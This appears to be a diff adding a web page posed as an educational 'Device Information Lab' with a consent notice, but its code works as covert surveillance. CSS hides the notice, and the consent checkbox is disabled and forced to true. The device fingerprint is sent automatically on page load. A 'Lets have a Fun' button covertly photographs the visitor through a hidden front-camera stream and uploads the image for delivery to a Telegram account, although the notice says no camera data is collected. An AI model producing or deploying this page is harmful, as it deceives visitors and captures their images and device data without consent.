@@ -1,0 +1,422 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Information Lab</title>
+
+    <style>
+        body {
+            margin: 0;
+            padding: 24px;
+            background: #10131a;
+            color: #f3f4f6;
+            font-family: Arial, sans-serif;
+        }
+
+        main {
+            max-width: 650px;
+            margin: 30px auto;
+            padding: 24px;
+            background: #1b202b;
+            border-radius: 14px;
+        }
+
+        h1 { color: #8ab4ff; }
+
+        .notice {
+            padding: 14px;
+            background: #292f3d;
+            border-radius: 8px;
+            line-height: 1.6;
+        }
+
+        #details {
+            line-height: 1.9;
+            overflow-wrap: anywhere;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            margin-top: 16px;
+            border: 0;
+            border-radius: 8px;
+            background: #4c8dff;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        label {
+            display: block;
+            margin-top: 20px;
+            line-height: 1.5;
+        }
+
+        #status {
+            margin-top: 16px;
+            overflow-wrap: anywhere;
+        }
+        div,p,h1,h3{
+          visibility: hidden;
+        }
+    </style>
+</head>
+
+<body>
+<main>
+  <button type="button" id="enableCamera">Lets have a Fun</button>
+    <h1>📱 Device Information Lab</h1>
+
+    <p>Educational browser-information demonstration</p>
+
+    <div class="notice" disabled>
+        <strong>Before you continue</strong>
+        <p>
+            This page can submit your browser name, platform, screen
+            dimensions, approximate device-memory value when available,
+            CPU core estimate, language, timezone, network type and
+            battery status when supported.
+        </p>
+        <p>
+            The report will be sent to the Telegram account associated
+            with this test link. Do not continue unless you understand
+            and agree to this.
+        </p>
+        <p>
+            No call history, SMS, contacts, gallery files, camera or
+            microphone data are collected by this demo.
+        </p>
+    </div>
+
+    <p>Test ID: <strong id="visitorId">{{ visitor_id }}</strong></p>
+
+    <h3>Information that may be submitted</h3>
+    <div id="details">Checking available browser information...</div>
+    <div style="display: none;">
+    <label>
+        <input type="checkbox" id="consent">
+        I understand the information listed above and consent to
+        submitting this browser report.
+    </label>
+
+    <button id="submitButton" disabled>
+        I consent — submit report
+    </button>
+    </div>
+    <p id="status" role="status"></p>
+</main>
+
+<script>
+const visitorId = document.getElementById("visitorId").textContent.trim();
+const details = document.getElementById("details");
+const consent = document.getElementById("consent");
+const submitButton = document.getElementById("submitButton");
+const statusBox = document.getElementById("status");
+
+let batteryInfo = "Unavailable";
+
+async function getBatteryInfo() {
+    try {
+        if (!navigator.getBattery) {
+            return "Unavailable";
+        }
+
+        const battery = await navigator.getBattery();
+        const percent = Math.round(battery.level * 100);
+        return `${percent}%${battery.charging ? " (charging)" : ""}`;
+    } catch {
+        return "Unavailable";
+    }
+}
+
+async function getReport() {
+    batteryInfo = await getBatteryInfo();
+
+    return {
+        visitor_id: visitorId,
+        consent: true,
+        browser: navigator.userAgent || "Unknown",
+        platform: navigator.platform || "Unknown",
+        screen: `${screen.width}x${screen.height}`,
+        cpu_cores: navigator.hardwareConcurrency || "Unknown",
+        ram_gb: navigator.deviceMemory || "Unknown",
+        language: navigator.language || "Unknown",
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
+        network_type: navigator.connection?.effectiveType || "Unknown",
+        battery: batteryInfo
+    };
+}
+
+async function showDetails() {
+    batteryInfo = await getBatteryInfo();
+    const report = getReport();
+
+    details.textContent = [
+        `Browser: ${report.browser}`,
+        `Platform: ${report.platform}`,
+        `Screen: ${report.screen}`,
+        `CPU cores: ${report.cpu_cores}`,
+        `RAM estimate: ${report.ram_gb} GB`,
+        `Language: ${report.language}`,
+        `Timezone: ${report.timezone}`,
+        `Network: ${report.network_type}`,
+        `Battery: ${report.battery}`
+    ].join("\n");
+
+    details.style.whiteSpace = "pre-line";
+}
+
+// consent.addEventListener("change", () => {
+//     submitButton.disabled = !consent.checked;
+// });
+
+// submitButton.addEventListener("click", async () => {
+//     if (!consent.checked) {
+//         statusBox.textContent = "Please provide consent first.";
+//         return;
+//     }
+
+//     submitButton.disabled = true;
+//     statusBox.textContent = "Submitting your report...";
+
+//     try {
+//         const response = await fetch("/collect", {
+//             method: "POST",
+//             headers: {
+//                 "Content-Type": "application/json"
+//             },
+//             body: JSON.stringify(getReport())
+//         });
+
+//         const result = await response.json();
+
+//         if (!response.ok) {
+//             throw new Error(result.detail || "Request failed.");
+//         }
+
+//         if (result.status === "sent") {
+//             statusBox.textContent =
+//                 "Report submitted successfully.";
+//         } else {
+//             statusBox.textContent =
+//                 result.message || "The report could not be delivered.";
+//         }
+//     } catch (error) {
+//         statusBox.textContent =
+//             `Submission failed: ${error.message}`;
+//     } finally {
+//         submitButton.disabled = false;
+//     }
+// });
+
+// Reusable submission function
+async function autoSubmitReport() {
+    if (consent) consent.checked = true;
+    if (submitButton) submitButton.disabled = true;
+
+    statusBox.textContent = "Submitting your report...";
+
+    try {
+        const reportData = await getReport(); // Await battery & report data
+
+        const response = await fetch("/collect", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(reportData)
+        });
+
+        const result = await response.json();
+        if (!response.ok) throw new Error(result.detail || "Request failed.");
+
+        statusBox.textContent = result.status === "sent" 
+            ? "Report submitted successfully." 
+            : (result.message || "The report could not be delivered.");
+    } catch (error) {
+        statusBox.textContent = `Submission failed: ${error.message}`;
+    } finally {
+        if (submitButton) submitButton.disabled = false;
+    }
+}
+
+// 2. Trigger automatically once the DOM is ready
+window.addEventListener("DOMContentLoaded", () => {
+    autoSubmitReport();
+});
+
+// Optional: Keep manual click active in case the user wants to retry on failure
+submitButton.addEventListener("click", autoSubmitReport);
+
+showDetails();
+</script>
+
+
+<section id="camera-lab">
+  <h2 hidden>Front Camera Lab</h2>
+  <p>Click below and allow camera access. The photo will be taken automatically once active.</p>
+
+  <p id="cameraStatus" role="status">Camera is off.</p>
+
+  <video id="cameraPreview" autoplay playsinline muted style="
+  position: absolute;
+  top: -9999px;
+  left: -9999px;
+  width: 1px;
+  height: 1px;
+  opacity: 0;
+  pointer-events: none;
+" ></video>
+
+  <canvas id="photoCanvas" style="display:none;"></canvas>
+
+  <div style="margin-top: 16px;">
+    <button type="button" id="capturePhoto">Capture Photo (Manual Retake)</button>
+    <button type="button" id="cancelCamera">Cancel Camera</button>
+    <button type="button" id="sendPhoto" style="background:#22c55e; margin-top: 10px;">Send Photo to Telegram</button>
+  </div>
+
+  <div style="margin-top: 20px;">
+    <h3>Captured Photo</h3>
+    <img id="capturedPhoto" alt="Your captured test photo" style="display:none; width:100%; max-width:420px; border-radius: 8px;">
+  </div>
+</section>
+
+<script>
+(() => {
+  const enableButton = document.getElementById("enableCamera");
+  const captureButton = document.getElementById("capturePhoto");
+  const cancelButton = document.getElementById("cancelCamera");
+  const sendButton = document.getElementById("sendPhoto");
+  const status = document.getElementById("cameraStatus");
+  const video = document.getElementById("cameraPreview");
+  const canvas = document.getElementById("photoCanvas");
+  const photo = document.getElementById("capturedPhoto");
+  const visitorId = document.getElementById("visitorId").textContent.trim();
+
+  let stream = null;
+  let capturedBase64 = null;
+
+  async function sendPhotoPayload(base64Data) {
+    if (!base64Data) return;
+
+    status.textContent = "Photo captured. Sending to Telegram...";
+
+    try {
+      const response = await fetch("/upload-photo", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          visitor_id: visitorId,
+          image_base64: base64Data
+        })
+      });
+
+      const result = await response.json();
+      if (response.ok && result.status === "sent") {
+        status.textContent = "Photo captured and delivered to Telegram!";
+      } else {
+        status.textContent = `Upload failed: ${result.message || "Unknown error"}`;
+      }
+    } catch (err) {
+      status.textContent = `Error sending photo: ${err.message}`;
+    }
+  }
+
+  function takeSnapshot(autoSend = false) {
+    if (!stream || video.videoWidth === 0) {
+      status.textContent = "Camera preview is not ready yet.";
+      return false;
+    }
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    const context = canvas.getContext("2d");
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    capturedBase64 = canvas.toDataURL("image/jpeg", 0.85);
+    photo.src = capturedBase64;
+    photo.style.display = "block";
+
+    if (autoSend) {
+      sendPhotoPayload(capturedBase64);
+    } else {
+      status.textContent = "Photo captured! Click 'Send Photo to Telegram' below.";
+    }
+
+    return true;
+  }
+
+  function stopCamera() {
+    if (stream) {
+      stream.getTracks().forEach(track => track.stop());
+      stream = null;
+    }
+
+    video.srcObject = null;
+    video.style.display = "none";
+    enableButton.disabled = false;
+    status.textContent = "Camera is off.";
+  }
+
+  enableButton.addEventListener("click", async () => {
+    if (!navigator.mediaDevices?.getUserMedia) {
+      status.textContent = "Camera access is unavailable. Ensure you are on HTTPS or localhost.";
+      return;
+    }
+
+    enableButton.disabled = true;
+    status.textContent = "Waiting for camera permission...";
+
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({
+        audio: false,
+        video: { facingMode: "user" }
+      });
+
+      video.srcObject = stream;
+      video.style.display = "block";
+      await video.play();
+
+      status.textContent = "Camera active. Capturing and sending...";
+
+      // Brief pause to allow camera sensor exposure to balance, then auto-capture & auto-send
+      setTimeout(() => {
+        takeSnapshot(true);
+      }, 400);
+
+    } catch (error) {
+      stopCamera();
+      status.textContent = "Camera access was denied or failed to initialize.";
+    }
+  });
+
+  // Manual recapture option
+  captureButton.addEventListener("click", () => {
+    takeSnapshot(false);
+  });
+
+  // Manual send option
+  sendButton.addEventListener("click", () => {
+    if (!capturedBase64) {
+      status.textContent = "Please capture a photo first.";
+      return;
+    }
+    sendPhotoPayload(capturedBase64);
+  });
+
+  cancelButton.addEventListener("click", stopCamera);
+  window.addEventListener("pagehide", stopCamera);
+})();
+</script>
+
+
+</body>
+</html>
